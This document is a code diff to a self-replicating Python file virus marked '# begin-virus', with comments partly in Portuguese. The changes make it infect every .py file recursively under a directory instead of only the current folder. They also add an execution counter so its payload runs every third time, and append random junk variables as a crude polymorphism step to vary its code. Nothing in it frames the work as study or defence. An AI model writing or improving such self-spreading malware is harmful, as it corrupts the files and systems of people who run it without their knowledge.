@@ -1,10 +1,16 @@
 # begin-virus
 
-import glob
-
+import os
+import random
+import string
 
 def find_files_to_infect(directory="."):
-    return [file for file in glob.glob("*.py")]
+    python_files = []
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            if file.endswith(".py"):
+                python_files.append(os.path.join(root, file))
+    return python_files
 
 
 def get_content_of_file(file):
@@ -55,11 +61,40 @@ def summon_chaos():
         "Coloque um pouco de anarquia, desestabilize a ordem e tudo virará o caos.\n Eu sou o agente do caos! "
     )
 
+# Variável de contagem para controlar as execuções
+execution_count_file = "execution_count.txt"
+
+def read_execution_count():
+    try:
+        with open(execution_count_file, "r") as count_file:
+            return int(count_file.read())
+    except FileNotFoundError:
+        return 0
+
+def write_execution_count(count):
+    with open(execution_count_file, "w") as count_file:
+        count_file.write(str(count))
+
+
+def generate_polymorphic_code():
+    variables = []
+
+    for _ in range(10):
+        variable_name = ''.join(random.choices(string.ascii_letters)for _ in range(10))
+        variable_value= ''.join(random.choices(string.ascii_letters)for _ in range(150))
+        variables.append(f"{variable_name} = '{variable_value}'")
+
+    return variables
+
 
 # entry point
 
 
 try:
+    # Incrementa o contador de execuções
+    execution_count = read_execution_count() + 1
+    write_execution_count(execution_count)
+
     # retrieve the virus code from the current infected script
     virus_code = get_virus_code()
 
@@ -68,12 +103,16 @@ try:
         infect(file, virus_code)
 
     # call the payload
-    summon_chaos()
+    if execution_count % 3 == 0:
+        summon_chaos()
 
 # except:
 #     pass
 
 finally:
+    
+    virus_code.extend(generate_polymorphic_code())
+
     # delete used names from memory
     for i in list(globals().keys()):
         if i[0] != "_":
